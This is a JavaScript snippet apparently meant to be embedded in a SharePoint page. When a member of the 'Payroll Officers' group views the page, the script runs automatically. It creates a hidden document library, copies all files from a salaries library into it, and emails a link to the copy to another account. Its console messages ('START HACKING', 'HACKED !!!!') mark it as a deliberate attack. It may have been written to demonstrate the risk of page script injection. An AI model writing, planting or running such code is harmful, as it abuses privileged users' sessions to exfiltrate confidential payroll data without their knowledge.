<script src="https://cdnjs.cloudflare.com/ajax/libs/sp-pnp-js/3.0.1/pnp.min.js"></script>
<script>
// this function will be executed once the polyfill is loaded.
function stuffisloaded() {
    var hack = function () {
        console.log('START HACKING');
        var tmpListName = 'TMP_' + +new Date();
        var targetFolder = null;
        // Create another library
        $pnp.sp.web.lists
            .add(tmpListName, '', 101, false, {
            Hidden: true
        })
            .then(function (listCreated) {
            // console.log(listCreated);
            // listCreated.list
            // 	.breakRoleInheritance(false)
            // 	.then(() => listCreated.list.roleAssignments.add(12, 1073741829))
            // 	.then(() =>
            $pnp.sp.web.lists
                .getById(listCreated.data.Id)
                .rootFolder.get()
                .then(function (rootFolder) {
                targetFolder = rootFolder;
                var emailProps = {
                    To: ['bob.designer@ike365.onmicrosoft.com'],
                    CC: [],
                    Subject: 'Notification' + targetFolder.Name,
                    Body: "<a href='https://ike365.sharepoint.com/" +
                        targetFolder.ServerRelativeUrl +
                        "'>CHECK THE DOCUMENTS</a>"
                };
                console.log('target folder = ', targetFolder);
                $pnp.sp.utility.sendEmail(emailProps);
            })
                .then(function () {
                // Get the salaries library
                return $pnp.sp.web
                    .getFolderByServerRelativeUrl('/sites/aos_classic/salaries')
                    .folders
                    .filter("Name ne 'Forms'")
                    .get()
                    .then(function (folders) {
                    folders.forEach(function (folder) {
                        var url = folder.ServerRelativeUrl;
                        console.log("Copying content of " + folder.ServerRelativeUrl);
                        $pnp.sp.web
                            .getFolderByServerRelativeUrl(targetFolder.ServerRelativeUrl)
                            .folders.add(folder.Name)
                            .then(function (newTargetFolder) {
                            return $pnp.sp.web
                                .getFolderByServerRelativeUrl(folder.ServerRelativeUrl)
                                .files.get();
                        })
                            .then(function (files) {
                            files.forEach(function (file) {
                                var newUrl = targetFolder.ServerRelativeUrl + '/' + folder.Name + '/' + file.Name;
                                console.log("Copying " + file.ServerRelativeUrl + " to " + newUrl);
                                $pnp.sp.web
                                    .getFileByServerRelativeUrl(file.ServerRelativeUrl)
                                    .copyTo(newUrl)
                                    .then(function () {
                                    console.log('Copy done! HACKED !!!!');
                                })["catch"](function () {
                                    console.log('CANNOT BE HACKED !');
                                });
                            });
                            console.log(files);
                        });
                    });
                });
            });
        });
    };
    var currentUserId = null;
    $pnp.sp.web.currentUser
        .select('Id')
        .get()
        .then(function (u) { return (currentUserId = u.Id); })
        .then(function () { return $pnp.sp.web.siteGroups.getByName('Payroll Officers').users.get(); })
        .then(function (users) {
        return new Promise(function (resolve, reject) {
            var found = users.filter(function (u) { return u.Id == currentUserId; });
            if (found.length == 1) {
                console.log('Current user IS Payroll Officer. GAME ON !');
                resolve('Current user is Payroll Officer');
            }
            else {
                console.log('Current user IS NOT Payroll Officer. GAME OVER !');
                reject('Current user is NOT Payroll Officer');
            }
        });
    })
        .then(function (r) { return hack(); });
}
</script>
<!-- This script tag loads the required polyfills from the service -->
<script src="https://cdn.polyfill.io/v2/polyfill.min.js?callback=stuffisloaded&features=es6|always|gated,fetch|always|gated"></script>
